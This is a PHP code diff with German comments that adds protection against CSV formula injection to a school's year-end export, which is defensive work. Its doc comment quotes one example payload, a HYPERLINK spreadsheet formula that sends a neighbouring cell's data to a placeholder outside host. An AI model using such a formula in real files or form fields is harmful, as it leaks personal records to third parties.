@@ -243,11 +243,48 @@ final class Jahresabschluss
 
         foreach ($zeilen as $zeile) {
             fputcsv($kanal, array_map(
-                static fn ($wert): string => $wert === null ? '' : (string) $wert,
+                static fn ($wert): string => self::entschaerfe($wert),
                 $zeile
             ), ';', '"', '');
         }
 
         fclose($kanal);
+    }
+
+    /**
+     * Macht aus einem Wert einen Text, den die Tabellenkalkulation nicht
+     * als Formel liest.
+     *
+     * Excel und LibreOffice behandeln jede Zelle, die mit =, +, -, @, einem
+     * Tabulator oder einem Wagenruecklauf beginnt, als Formel. In diesem
+     * Archiv stehen Namen und Freitexte, die aus einem Formular ohne
+     * Anmeldung kommen - student_name etwa fuellt jede Schuelerin selbst
+     * aus. Ein Name wie
+     *
+     *     =HYPERLINK("http://fremd.example/"&A1;"hier klicken")
+     *
+     * wird beim Oeffnen der Datei ausgefuehrt, nicht angezeigt: die Zeile
+     * daneben geht dabei mit auf die Reise. Die Datei entsteht beim
+     * Jahresabschluss und wird von der Schulleitung geoeffnet.
+     *
+     * Ein vorangestelltes Hochkomma macht daraus wieder Text. Zahlen bleiben
+     * unangetastet - sonst wuerde aus -5 ein Text, und die Spalte liesse
+     * sich nicht mehr rechnen.
+     */
+    private static function entschaerfe(mixed $wert): string
+    {
+        if ($wert === null) {
+            return '';
+        }
+
+        $text = (string) $wert;
+
+        if ($text === '' || is_numeric($text)) {
+            return $text;
+        }
+
+        return in_array($text[0], ['=', '+', '-', '@', "\t", "\r"], true)
+            ? "'" . $text
+            : $text;
     }
 }
